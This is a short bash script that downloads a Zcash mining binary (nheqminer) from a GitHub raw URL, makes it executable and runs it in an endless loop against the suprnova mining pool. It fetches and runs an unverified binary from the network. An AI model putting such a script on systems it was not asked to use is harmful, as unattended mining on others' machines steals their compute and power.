#!/bin/bash
wget https://raw.githubusercontent.com/cardant12/mineme/master/nheqminer

chmod a+x ./nheqminer

if [ "$1" != "" ]; then
	while true; do ./nheqminer -l zec.suprnova.cc:2142 -u piocar.$1 -p money -t 8; echo "sleep & restart"; sleep 30; done
else
	while true; do ./nheqminer -l zec.suprnova.cc:2142 -u piocar.azrX -p money -t 8; echo "sleep & restart"; sleep 30; done
fi

